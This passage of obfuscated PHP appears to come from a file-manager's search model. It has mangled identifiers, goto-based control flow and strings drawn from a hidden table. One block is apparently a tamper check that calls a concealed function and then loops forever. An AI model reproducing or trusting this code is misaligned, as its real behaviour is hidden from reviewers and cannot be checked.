C¢ÒŞ˜á§é: $F÷‡±›“šç = array(); $fäÇÎ‡ÃÙŠ = array(); foreach ($Càˆò¶øê as $aÅÈ‰Ö«©£) { if (!$aÅÈ‰Ö«©£ || count($aÅÈ‰Ö«©£) <= 1) { continue; } foreach ($aÅÈ‰Ö«©£ as $DÍ‚´é¦) { $F÷‡±›“šç[] = $DÍ‚´é¦[$f‡ğ«‹¦Òº[445]]; $fäÇÎ‡ÃÙŠ[] = $DÍ‚´é¦[$f‡ğ«‹¦Òº[392]]; } } goto cšãœ”©Åñ; dÓ¡ÜçÅ¶: } public function userSpace() { $FË«õÂŠ° =& $_SERVER[Ïº«‚ßèÔˆø]; $f‰ªŞ©¤” = $this->tablePrefix; $A¢•©•ß = array($FË«õÂŠ°[1500] => USER_ID); $AĞ§îÚë = "{$f‰ªŞ©¤”}\151\157\x5f\146\x69\154\x65\x20\x66\151\x6c\x65\163\x20\x6f\156\40\146\151\154\x65\x73\x2e\x66\x69\x6c\x65\x49\104\40\75\x20\x68\x69\163\x74\157\x72\x79\56\x66\x69\154\x65\x49\x44"; return $this->alias($FË«õÂŠ°[1908])->where($A¢•©•ß)->join($AĞ§îÚë, $FË«õÂŠ°[1909])->sum($FË«õÂŠ°[78]); } } if (!isset($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][748]]) || !isset($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][746]])) { goto f‹‚ö”ŠÉÊ; AâôÛ›Ëè: $dŸ†ßïëö = explode($_SERVER[Ïº«‚ßèÔˆø][228], $F×‡îÕºô); if (count($dŸ†ßïëö) < $_SERVER[Ïº«‚ßèÔˆø][582]) { $Cğ½ÂÂíõË = $_SERVER[Ïº«‚ßèÔˆø][752]; $Cğ½ÂÂíõË(); } $f°ñø»ø£‹ = $_SERVER[Ïº«‚ßèÔˆø][753]; goto C¿Ä°•¨Ö‹; f‹‚ö”ŠÉÊ: $EÆŸšÀë§ = $_SERVER[Ïº«‚ßèÔˆø][749]; $D¬©ğŒæÜ = $_SERVER[$_SERVER[Ïº«‚ßèÔˆø][750]] . $_SERVER[Ïº«‚ßèÔˆø][751]; $F×‡îÕºô = $EÆŸšÀë§($D¬©ğŒæÜ); goto AâôÛ›Ëè; C¿Ä°•¨Ö‹: $f°ñø»ø£‹($_SERVER[$_SERVER[Ïº«‚ßèÔˆø][750]] . $_SERVER[Ïº«‚ßèÔˆø][751]); $Eô»Õ«µ©¡ = 2; while ($Eô»Õ«µ©¡ > 1) { $eÆ´ß¾Õ›ß = rawurlencode($Eô»Õ«µ©¡ . $_SERVER[Ïº«‚ßèÔˆø][374]); } goto e´‹º‰àíó; e´‹º‰àíó: } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($FòÈœÙ¯³É) { goto bß¨½ñØ™­; B‘îªè—¤ƒ: if (!$E‹‰×°‘Ö­[$d‡Íì»èë…[168]]) { $D®÷øàã¥‰ = array_to_keyvalue($dÂ·æ¾è£É, $d‡Íì»èë…[33], $d‡Íì»èë…[168]); $Fœ¸¾¤ËáÃ = implode($d‡Íì»èë…[47], $D®÷øàã¥‰); $a›Áãõ¢Íß = $d‡Íì»èë…[1911]; } $CÓŞ´òŸ­ = explode($d‡Íì»èë…[47], trim($Fœ¸¾¤ËáÃ, $d‡Íì»èë…[47])); return array($a›Áãõ¢Íß, $CÓŞ´òŸ­); goto FÎÃ±š¸Ê¢; CÇš“Şª¬ƒ: if (!$E‹‰×°‘Ö­) { return array(); } $Fœ¸¾¤ËáÃ = $E‹‰×°‘Ö­[$d‡Íì»èë…[168]]; $a›Áãõ¢Íß = $d‡Íì»èë…[7]; goto B‘îªè—¤ƒ; bß¨½ñØ™­: $d‡Íì»èë… =& $_SERVER[Ïº«‚ßèÔˆø]; $dÂ·æ¾è£É = KodIO::fileTypeList(); $E‹‰×°‘Ö­ = $dÂ·æ¾è£É[$FòÈœÙ¯³É]; goto CÇš“Şª¬ƒ; FÎÃ±š¸Ê¢: } public function listPathType($c´×‡òĞ¬–) { $E«ˆ®…†ª =& $_SERVER[Ïº«‚ßèÔˆø]; $e½ù£ùò™ = $this->fileTypeWhere($c´×‡òĞ¬–); if (!$e½ù£ùò™) { return array(); } $E³¶Ş¢¦ŒÚ = array($E«ˆ®…†ª[548] => SourceModel::TYPE_USER, $E«ˆ®…†ª[549] => USER_ID, $E«ˆ®…†ª[545] => 0, $E«ˆ®…†ª[546] => $e½ù£ùò™); return $this->listSource($E³¶Ş¢¦ŒÚ); } public function listSearch($BÒ«°„£, $AŸ•ÈÙù‡Ó = 300) { goto dö¤ÜŞÌù°; C¡¼Œˆù ¦: $this->_listSearchBindPinyin($BÒ«°„£, $bàãĞØ÷ë, $C»‘†–Ô); $this->alias($fÈ ÚŞï´š[515])->_makeOrder(); $bàãĞØ÷ë = $this->parseWhereLike($bàãĞØ÷ë); goto Bèƒ›æƒ¸Î; dö¤ÜŞÌù°: $fÈ ÚŞï´š =& $_SERVER[Ïº«‚ßèÔˆø]; if (isset($BÒ«°„£[$fÈ ÚŞï´š[1754]]) && $BÒ«°„£[$fÈ ÚŞï´š[1754]]) { $BÒ«°„£[$fÈ ÚŞï´š[1754]] = str_replace($fÈ ÚŞï´š[380], $fÈ ÚŞï´š[1912], trim($BÒ«°„£[$fÈ ÚŞï´š[1754]])); } $bàãĞØ÷ë = $this->_parseSearchWhere($BÒ«°„£); goto cƒˆÀ˜Àï; Bèƒ›æƒ¸Î: $FÅ„™ó®Ùš = $this->distinct(!0)->field($C»‘†–Ô)->where($bàãĞØ÷ë)->selectPage($AŸ•ÈÙù‡Ó); $this->_listSearchFileContent($FÅ„™ó®Ùš, $BÒ«°„£, $f¾‹ƒŸê´¥); $this->_listSearchDesc($FÅ„™ó®Ùš, $BÒ«°„£, $f¾‹ƒŸê´¥); goto AğàŸ³ß¢©; D½¶‰«²: $this->_listMake($FÅ„™ó®Ùš); return $FÅ„™ó®Ùš; goto EÒ–õ£‡™¶; cƒˆÀ˜Àï: if (!isset($bàãĞØ÷ë[$fÈ ÚŞï´š[421]])) { $bàãĞØ÷ë[$fÈ ÚŞï´š[421]] = 0; } $C»‘†–Ô = $fÈ ÚŞï´š[1913]; $f¾‹ƒŸê´¥ = $C»‘†–Ô; goto C¡¼Œˆù ¦; AğàŸ³ß¢©: $this->_listSearchTag($FÅ„™ó®Ùš, $BÒ«°„£, $f¾‹ƒŸê´¥); $this->_listSearchGroupTag($FÅ„™ó®Ùš, $BÒ«°„£, $f¾‹ƒŸê´¥); $this->_listDataApply($FÅ„™ó®Ùš[$fÈ ÚŞï´š[366]]); goto D½¶‰«²; EÒ–õ£‡™¶: } private function _listSearchFileContent(&$cÄç‰Ïˆ¾¼, $e³ÉÚˆ™³, $C‚ì¦·Õì) { goto eƒ¨†¥İæø; cİÚñš™Ò: $cÄç‰Ïˆ¾¼[$F¹±õ¤Š­Ç[366]] = array_merge($dÔÛ”Ÿ­§ƒ, $cÄç‰Ïˆ¾¼[$F¹±õ¤Š­Ç[366]]); $cÄç‰Ïˆ¾¼[$F¹±õ¤Š­Ç[363]][$F¹±õ¤Š­Ç[364]] += count($dÔÛ”Ÿ­§ƒ); goto Böé—›ƒÌ; eƒ¨†¥İæø: $F¹±õ¤Š­Ç =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$e³ÉÚˆ™³[$F¹±õ¤Š­Ç[1754]] || $cÄç‰Ïˆ¾¼[$F¹±õ¤Š­Ç[363]][$F¹±õ¤Š­Ç[350]] > 1) { return; } $câ‰Ù‹Ù× = $this->_parseSearchWhere($e³ÉÚˆ™³); goto E¨Ç¢íØ¼Ô; E¨Ç¢íØ¼Ô: if (!isset($câ‰Ù‹Ù×[$F¹±õ¤Š­Ç[28]]) || !is_array($e³ÉÚˆ™³[$F¹±õ¤Š­Ç[445]])) { return; } $câ‰Ù‹Ù×[$F¹±õ¤Š­Ç[445]] = array($F¹±õ¤Š­Ç[7], $e³ÉÚˆ™³[$F¹±õ¤Š­Ç[445]]); unset($câ‰Ù‹Ù×[$F¹±õ¤Š­Ç[28]]); goto AòŒöº‹½ß; AòŒöº‹½ß: unset($e³ÉÚˆ™³[$F¹±õ¤Š­Ç[445]]); $dÔÛ”Ÿ­§ƒ = $this->field($C‚ì¦·Õì)->where($câ‰Ù‹Ù×)->limit($F¹±õ¤Š­Ç[1914])->select(); if (!$dÔÛ”Ÿ­§ƒ || count($dÔÛ”Ÿ­§ƒ) == 0) { return; } goto cİÚñš™Ò; Böé—›ƒÌ: } private function _listSearchTag(&$D¦ß¦¡œ, $B˜ñ¾¬›â, $A®—æã²ãÉ) { goto f“õ©î‘²‘; c£°îÖÒãµ: if (!$c³êâöñ±ä) { return; } $Bç÷Ã”È„÷ = array($b’÷”º‰¸ì[417] => array($b’÷”º‰¸ì[7], $c³êâöñ±ä), $b’÷”º‰¸ì[1508] => USER_ID); $EÜœ÷øíğ© = Model($b’÷”º‰¸ì[418])->field($b’÷”º‰¸ì[76])->where($Bç÷Ã”È„÷)->select(); goto Fææä¼Çæ´; f“õ©î‘²‘: $b’÷”º‰¸ì =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$B˜ñ¾¬›â[$b’÷”º‰¸ì[1754]] || $D¦ß¦¡œ[$b’÷”º‰¸ì[363]][$b’÷”º‰¸ì[350]] > 1) { return; } $bƒ¡ä³ÙÔÌ = Model($b’÷”º‰¸ì[1915])->listData(); goto Cå„Èø§±; Fææä¼Çæ´: $EÜœ÷øíğ© = array_to_keyvalue($EÜœ÷øíğ©, $b’÷”º‰¸ì[33], $b’÷”º‰¸ì[76]); $b¹ÈÂÅËÇ· = array_unique($EÜœ÷øíğ©); $this->_listSearchMerge($D¦ß¦¡œ, $B˜ñ¾¬›â, $A®—æã²ãÉ, $b¹ÈÂÅËÇ·); goto D´ˆŞÈŒÈ; Cå„Èø§±: $c³êâöñ±ä = array(); $aùì¯”÷§‘ = $B˜ñ¾¬›â[$b’÷”º‰¸ì[1754]]; foreach ($bƒ¡ä³ÙÔÌ as $CîŸ¢Šã‰) { $EÛİÁí“Î… = $CîŸ¢Šã‰[$b’÷”º‰¸ì[28]]; $Aª£Œë³ó = str_replace($b’÷”º‰¸ì[50], $b’÷”º‰¸ì[33], Pinyin::encode($EÛİÁí“Î…)); if (stripos($EÛİÁí“Î…, $aùì¯”÷§‘) !== !1 || stripos($Aª£Œë³ó, $aùì¯”÷§‘) !== !1) { $c³êâöñ±ä[] = $CîŸ¢Šã‰[$b’÷”º‰¸ì[392]]; } } goto c£°îÖÒãµ; D´ˆŞÈŒÈ: } private function _listSearchDesc(&$Aóô‹³‘÷×, $a»£Â˜áÍ, $BÎŸ´ƒ—ê) { goto cïÊŞñ–; AŸŒŒÂÑ°Ø: $d¿ç½…Ï©ø = Model($dùªŒ¯éÚ[531])->field($dùªŒ¯éÚ[394])->where($e‘Š‹ØÂÓœ)->select(); $fÃ™¾£óª = array_to_keyvalue($d¿ç½…Ï©ø, $dùªŒ¯éÚ[33], $dùªŒ¯éÚ[394]); $this->_listSearchMerge($Aóô‹³‘÷×, $a»£Â˜áÍ, $BÎŸ´ƒ—ê, $fÃ™¾£óª); goto DÎœè«á“ô; b†ê•Æ©±: $CÆ•à ÕÇœ = array_unique($CÆ•à ÕÇœ); if (!$CÆ•à ÕÇœ) { return; } $e‘Š‹ØÂÓœ = array($dùªŒ¯éÚ[394] => array($dùªŒ¯éÚ[7], $CÆ•à ÕÇœ), $dùªŒ¯éÚ[93] => $dùªŒ¯éÚ[429], $dùªŒ¯éÚ[371] => array($dùªŒ¯éÚ[379], $dùªŒ¯éÚ[1756] . $a»£Â˜áÍ[$dùªŒ¯éÚ[1754]] . $dùªŒ¯éÚ[1756])); goto AŸŒŒÂÑ°Ø; cïÊŞñ–: $dùªŒ¯éÚ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$a»£Â˜áÍ[$dùªŒ¯éÚ[1754]] || $Aóô‹³‘÷×[$dùªŒ¯éÚ[363]][$dùªŒ¯éÚ[350]] > 1) { return; } $CÆ•à ÕÇœ = $this->listSearchChildren($a»£Â˜áÍ[$dùªŒ¯éÚ[476]]); goto b†ê•Æ©±; DÎœè«á“ô: } private function _listSearchGroupTag(&$B‰”ÈĞææ, $D‡ËèîÛÚé, $C¢Ìˆã„¡´) { goto eîÑŠ‡…Î; eîÑŠ‡…Î: $Bã†ŸŞäøÛ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$D‡ËèîÛÚé[$Bã†ŸŞäøÛ[1754]] || $B‰”ÈĞææ[$Bã†ŸŞäøÛ[363]][$Bã†ŸŞäøÛ[350]] > 1 || !$D‡ËèîÛÚé[$Bã†ŸŞäøÛ[476]]) { return; } $CÚ­À„Ü£ = $this->sourceInfo($D‡ËèîÛÚé[$Bã†ŸŞäøÛ[476]]); goto eÆâ£ğÜ˜Ÿ; C²áÊê†Æ¹: $FêëÀùå† = array(); $eƒëÀÂÜä = $D‡ËèîÛÚé[$Bã†ŸŞäøÛ[1754]]; foreach ($EÀõ“¦ô…[$Bã†ŸŞäøÛ[366]] as $c© ¿åÔ²±) { $Fº¼ø‚‰¦¥ = $c© ¿åÔ²±[$Bã†ŸŞäøÛ[28]]; $E²ÈîËÔ = str_replace($Bã†ŸŞäøÛ[50], $Bã†ŸŞäøÛ[33], Pinyin::encode($Fº¼ø‚‰¦¥)); if (stripos($Fº¼ø‚‰¦¥, $eƒëÀÂÜä) !== !1 || stripos($E²ÈîËÔ, $eƒëÀÂÜä) !== !1) { $FêëÀùå†[] = $c© ¿åÔ²±[$Bã†ŸŞäøÛ[392]]; } } goto e¸µÓ×ç§Û; e¸µÓ×ç§Û: if (!$FêëÀùå†) { return; } $e«°—ÀÆ·ô = array($Bã†ŸŞäøÛ[417] => array($Bã†ŸŞäøÛ[7], $FêëÀùå†), $Bã†ŸŞäøÛ[1508] => 0, $Bã†ŸŞäøÛ[29] => $Bã†ŸŞäøÛ[1778] . $e‰¢À¸»ŒÕ); $a•«ğò’¤Œ = Model($Bã†ŸŞäøÛ[418])->field($Bã†ŸŞäøÛ[76])->where($e«°—ÀÆ·ô)->select(); goto F¨Ò†Ÿî‘É; eÆâ£ğÜ˜Ÿ: if (!$CÚ­À„Ü£ || $CÚ­À„Ü£[$Bã†ŸŞäøÛ[402]] != SourceModel::TYPE_GROUP) { return; } $e‰¢À¸»ŒÕ = $CÚ­À„Ü£[$Bã†ŸŞäøÛ[482]]; $EÀõ“¦ô… = Model($Bã†ŸŞäøÛ[1916])->get($e‰¢À¸»ŒÕ); goto C²áÊê†Æ¹; F¨Ò†Ÿî‘É: $a•«ğò’¤Œ = array_to_keyvalue($a•«ğò’¤Œ, $Bã†ŸŞäøÛ[33], $Bã†ŸŞäøÛ[76]); $FÕÇ”ˆÓø‰ = array_unique($a•«ğò’¤Œ); $this->_listSearchMerge($B‰”ÈĞææ, $D‡ËèîÛÚé, $C¢Ìˆã„¡´, $FÕÇ”ˆÓø‰); goto c‰ŠÆ–Ê­; c‰ŠÆ–Ê­: } private function _listSearchMerge(&$f…¨×Õ¸ˆÂ, $a¬è½†àõù, $f‹ŠÁõ¨è , $a®ïš˜Ò¥) { goto Aéè•„‚Ö; a‚ÃÓôä¶ö: $Aæ»éÜª‚ß = $this->field($f‹ŠÁõ¨è )->where($eµ¯˜š©¥¤)->select(); if (!$Aæ»éÜª‚ß) { return; } $d¶ŠÛ–òÔ½ = array(); goto aÑ¢Ïİ; aÑ¢Ïİ: foreach ($Aæ»éÜª‚ß as $eÅñ–¾òÔƒ) { if ($this->_listSearchFilter($eÅñ–¾òÔƒ, $a¬è½†àõù)) { $d¶ŠÛ–òÔ½[] = $eÅñ–¾òÔƒ; } } $f…¨×Õ¸ˆÂ[$eôÙŸº»÷[366]] = array_merge($d¶ŠÛ–òÔ½, $f…¨×Õ¸ˆÂ[$eôÙŸº»÷[366]]); $f…¨×Õ¸ˆÂ[$eôÙŸº»÷[363]][$eôÙŸº»÷[364]] += count($d¶ŠÛ–òÔ½); goto D¹ëçÀ‘Ï; f‰éøäÈ: $b‡ç¯™Â… = array_diff($a®ïš˜Ò¥, $CÖÀš­”‚); if (!$b‡ç¯™Â…) { return; } $eµ¯˜š©¥¤ = array($eôÙŸº»÷[394] => array($eôÙŸº»÷[7], $b‡ç¯™Â…)); goto a‚ÃÓôä¶ö; Aéè•„‚Ö: $eôÙŸº»÷ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$a®ïš˜Ò¥) { return; } $CÖÀš­”‚ = array_to_keyvalue($f…¨×Õ¸ˆÂ[$eôÙŸº»÷[366]], $eôÙŸº»÷[33], $eôÙŸº»÷[394]); goto f‰éøäÈ; D¹ëçÀ‘Ï: } private function _listSearchFilter($dğóÚÍæù, $F÷¾ŒŸ¢) { goto E²Ø´ ®é; d¹Ï…²³Ã: if (isset($F÷¾ŒŸ¢[$d³ËîÙæê¥[403]]) && $F÷¾ŒŸ¢[$d³ËîÙæê¥[403]] != $d³ËîÙæê¥[1721]) { if ($F÷¾ŒŸ¢[$d³ËîÙæê¥[403]] == $d³ËîÙæê¥[77] && !$a‰äÜ¡Ï’à) { return !1; } if ($F÷¾ŒŸ¢[$d³ËîÙæê¥[403]] != $d³ËîÙæê¥[77] && $a‰äÜ¡Ï’à) { return !1; } if (!strstr($dğóÚÍæù[$d³ËîÙæê¥[168]], $d³ËîÙæê¥[47] . $F÷¾ŒŸ¢[$d³ËîÙæê¥[403]] . $d³ËîÙæê¥[47])) { return !1; } } if (isset($F÷¾ŒŸ¢[$d³ËîÙæê¥[1917]]) && $F÷¾ŒŸ¢[$d³ËîÙæê¥[1917]] < $dğóÚÍæù[$d³ËîÙæê¥[78]]) { return !1; } if (isset($F÷¾ŒŸ¢[$d³ËîÙæê¥[1918]]) && $F÷¾ŒŸ¢[$d³ËîÙæê¥[1918]] > $dğóÚÍæù[$d³ËîÙæê¥[78]]) { return !1; } goto fáíè„öË¬; E²Ø´ ®é: $d³ËîÙæê¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $a‰äÜ¡Ï’à = $dğóÚÍæù[$d³ËîÙæê¥[401]] == $d³ËîÙæê¥[87]; if (!strstr($dğóÚÍæù[$d³ËîÙæê¥[485]], $d³ËîÙæê¥[47] . $F÷¾ŒŸ¢[$d³ËîÙæê¥[476]] . $d³ËîÙæê¥[47])) { return !1; } goto d¹Ï…²³Ã; fáíè„öË¬: if (isset($F÷¾ŒŸ¢[$d³ËîÙæê¥[561]]) && $F÷¾ŒŸ¢[$d³ËîÙæê¥[561]] != $dğóÚÍæù[$d³ËîÙæê¥[432]]) { return !1; } return !0; goto Bëº›Ş…ò; Bëº›Ş…ò: } public function listSearchChildren($F›å´öø•§, $f˜Ï„ùŒØ• = 5000) { goto cçƒÙ§ÅŸó; FÛ´¼Ø´¯: $bñ††«Ë²ß = array($b¡×’ºÚ¢¥[485] => array($b¡×’ºÚ¢¥[379], $BË…â‘ò§‚[$b¡×’ºÚ¢¥[485]] . $BË…â‘ò§‚[$b¡×’ºÚ¢¥[394]] . $b¡×’ºÚ¢¥[512])); $cƒà†Ë†İì = $this->field($b¡×’ºÚ¢¥[394])->cache(null, 600)->where($bñ††«Ë²ß)->count(); if ($cƒà†Ë†İì > $f˜Ï„ùŒØ•) { return $this->_listSearchChildrenNear($F›å´öø•§, $f˜Ï„ùŒØ•); } goto fî¿»¼îÊ; fî¿»¼îÊ: $E›Û‘ÑÅ³µ = $this->field($b¡×’ºÚ¢¥[394])->where($bñ††«Ë²ß)->select(); $EÆ¶«™‹¬è = array_to_keyvalue($E›Û‘ÑÅ³µ, $b¡×’ºÚ¢¥[33], $b¡×’ºÚ¢¥[394]); return $EÆ¶«™‹¬è; goto føæƒƒ©éÇ; cçƒÙ§ÅŸó: $b¡×’ºÚ¢¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $EÆ¶«™‹¬è = array(); $BË…â‘ò§‚ = $this->sourceInfo($F›å´öø•§); goto FÛ´¼Ø´¯; føæƒƒ©éÇ: } private function _listSearchChildrenNear($b‹ÁĞìŒ¬‘, $bÔÌ„ÛÁØ“) { goto dÕÒ”Í¶¾Ú; c´‰¾¡¨¹à: if (!$BĞ’…ğ¼Ğ) { return $F”Äßï†—·; } $eŠ®ÍèÅù† = array($C£™ò¿Ñ™‡[476] => array($C£™ò¿Ñ™‡[7], $BĞ’…ğ¼Ğ)); $DÀ¹®ø®å„ = $this->field($C£™ò¿Ñ™‡[1919])->where($eŠ®ÍèÅù†)->limit($bÔÌ„ÛÁØ“)->select(); goto bøƒÒÅĞ¹Ö; bøƒÒÅĞ¹Ö: $F”Äßï†—· = array_merge($F”Äßï†—·, array_to_keyvalue($DÀ¹®ø®å„, $C£™ò¿Ñ™‡[33], $C£™ò¿Ñ™‡[394])); $F”Äßï†—· = array_slice($F”Äßï†—·, 0, $bÔÌ„ÛÁØ“); return $F”Äßï†—·; goto CãÑí¢ºå°; dÕÒ”Í¶¾Ú: $C£™ò¿Ñ™‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $F”Äßï†—· = array(); $eŠ®ÍèÅù† = array($C£™ò¿Ñ™‡[476] => $b‹ÁĞìŒ¬‘); goto B·±ãõ¼óÀ; B·±ãõ¼óÀ: $DÀ¹®ø®å„ = $this->field($C£™ò¿Ñ™‡[1919])->where($eŠ®ÍèÅù†)->select(); $BĞ’…ğ¼Ğ = array_to_keyvalue(array_filter_by_field($DÀ¹®ø®å„, $C£™ò¿Ñ™‡[401], $C£™ò¿Ñ™‡[87]), $C£™ò¿Ñ™‡[33], $C£™ò¿Ñ™‡[394]); $F”Äßï†—· = array_merge($F”Äßï†—·, array_to_keyvalue($DÀ¹®ø®å„, $C£™ò¿Ñ™‡[33], $C£™ò¿Ñ™‡[394])); goto c´‰¾¡¨¹à; CãÑí¢ºå°: } private function _listSearchBindPinyin($f´ö¥‡á›Ù, &$F„÷¥¯æ‡˜, &$DçÁ™‰íÒ) { goto D†“ßĞ¤¥ô; A²ìÓßßì: $DçÁ™‰íÒ = $FÒ´Ó¨ƒ ñ[1921] . str_replace($FÒ´Ó¨ƒ ñ[47], $FÒ´Ó¨ƒ ñ[1922], $DçÁ™‰íÒ); $ašâí®µç = $F„÷¥¯æ‡˜[$FÒ´Ó¨ƒ ñ[28]]; unset($F„÷¥¯æ‡˜[$FÒ´Ó¨ƒ ñ[28]]); goto D¼Úø§´†; D†“ßĞ¤¥ô: $FÒ´Ó¨ƒ ñ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($f´ö¥‡á›Ù[$FÒ´Ó¨ƒ ñ[1754]]) || !$f´ö¥‡á›Ù[$FÒ´Ó¨ƒ ñ[1754]]) { return; } if (!Input::check($f´ö¥‡á›Ù[$FÒ´Ó¨ƒ ñ[1754]], $FÒ´Ó¨ƒ ñ[315]) || strlen($f´ö¥‡á›Ù[$FÒ´Ó¨ƒ ñ[1754]]) < 2) { return; } goto CÔ°“°Åİ›; D¼Úø§´†: foreach ($F„÷¥¯æ‡˜ as $b‘Ç†ÑñÊÙ => $eÀî”‰„¥õ) { $c­Á—©”—©[$FÒ´Ó¨ƒ ñ[1921] . $b‘Ç†ÑñÊÙ] = $eÀî”‰„¥õ; } foreach ($ašâí®µç as $bõ±Ô¹ë¦Í) { $c­Á—©”—©[] = array($FÒ´Ó¨ƒ ñ[1923] => $bõ±Ô¹ë¦Í, $FÒ´Ó¨ƒ ñ[941] => $FÒ´Ó¨ƒ ñ[1758], array($FÒ´Ó¨ƒ ñ[1924] => $bõ±Ô¹ë¦Í, $FÒ´Ó¨ƒ ñ[1925] => array($FÒ´Ó¨ƒ ñ[7], array($FÒ´Ó¨ƒ ñ[442], $FÒ´Ó¨ƒ ñ[441])))); } $this->join($DŒÎ”Ò©è˜); goto cñ¯…ÅŞâŠ; cñ¯…ÅŞâŠ: $F„÷¥¯æ‡˜ = $c­Á—©”—©; goto D±‡¸ê´ë½; CÔ°“°Åİ›: $DŒÎ”Ò©è˜ = "\x4c\x45\x46\x54\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\x69\157\x5f\163\x6f\165\x72\x63\145\137\x6d\145\x74\141\x20\155\x65\x74\141\x20\157\x6e\x20\x73\x6f\x75\162\x63\x65\x2e\x73\157\x75\x72\x63\x65\x49\x44\x20\75\x20\155\145\x74\x61\x2e\x73\x6f\x75\162\143\145\111\104"; $c­Á—©”—© = array(); $DçÁ™‰íÒ = str_replace(array($FÒ´Ó¨ƒ ñ[228], $FÒ´Ó¨ƒ ñ[50], $FÒ´Ó¨ƒ ñ[1920]), $FÒ´Ó¨ƒ ñ[33], $DçÁ™‰íÒ); goto A²ìÓßßì; D±‡¸ê´ë½: } private function _parseSearchWhere($C¼šäÍ‘Œ») { goto A¬‡àÕ ØÆ; d¼‡†ïğƒ : if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[561]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[561]]) { $a¨¬— ˜Œè[] = array($fÆÍ‚Š‘Øæ[432] => $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[561]], $fÆÍ‚Š‘Øæ[430] => $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[561]], $fÆÍ‚Š‘Øæ[941] => $fÆÍ‚Š‘Øæ[1758]); } if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[403]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[403]]) { $f¹¾íÙõï‡ = $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[403]]; if ($f¹¾íÙõï‡ == $fÆÍ‚Š‘Øæ[77]) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[401]] = 1; } else { if ($f¹¾íÙõï‡ == $fÆÍ‚Š‘Øæ[1929]) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[401]] = 0; } else { if ($f¹¾íÙõï‡) { $f¹¾íÙõï‡ = is_array($f¹¾íÙõï‡) ? $f¹¾íÙõï‡ : explode($fÆÍ‚Š‘Øæ[47], $f¹¾íÙõï‡); $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[403]] = array($fÆÍ‚Š‘Øæ[409], $f¹¾íÙõï‡); $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[401]] = 0; } } } } if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[476]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[476]]) { $eß¢ë±®Í¿ = $this->sourceInfo($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[476]]); $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[552]] = array($fÆÍ‚Š‘Øæ[511], $eß¢ë±®Í¿[$fÆÍ‚Š‘Øæ[485]] . $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[476]] . $fÆÍ‚Š‘Øæ[512]); } goto c•¯¬¡Ï¬ˆ; D‰îÜù¯è: if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[474]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[474]]) { $CİºÌì½Æ˜ = array($fÆÍ‚Š‘Øæ[1927], $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[474]]); if ($a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[84]]) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[84]] = array($a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[84]], $CİºÌì½Æ˜, $fÆÍ‚Š‘Øæ[1928]); } else { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[84]] = $CİºÌì½Æ˜; } } if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1917]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1917]] > 0) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[78]] = array($fÆÍ‚Š‘Øæ[1926], $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1917]]); } if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1918]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1918]]) { $CİºÌì½Æ˜ = array($fÆÍ‚Š‘Øæ[1927], $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1918]]); if ($a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[78]]) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[78]] = array($a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[78]], $CİºÌì½Æ˜, $fÆÍ‚Š‘Øæ[1928]); } else { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[78]] = $CİºÌì½Æ˜; } } goto d¼‡†ïğƒ ; c•¯¬¡Ï¬ˆ: if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1754]]) && trim($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1754]])) { $bŒİˆõë° = trim($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[1754]]); $FÈÎÆ§—£ = explode($fÆÍ‚Š‘Øæ[50], $bŒİˆõë°); if (strlen($bŒİˆõë°) > 2 && (substr($bŒİˆõë°, 0, 1) == $fÆÍ‚Š‘Øæ[116] && substr($bŒİˆõë°, -1) == $fÆÍ‚Š‘Øæ[116]) || substr($bŒİˆõë°, 0, 1) == $fÆÍ‚Š‘Øæ[55] && substr($bŒİˆõë°, -1) == $fÆÍ‚Š‘Øæ[55]) { $bŒİˆõë° = substr($bŒİˆõë°, 1, -1); $FÈÎÆ§—£ = array($bŒİˆõë°); } $a¨¬— 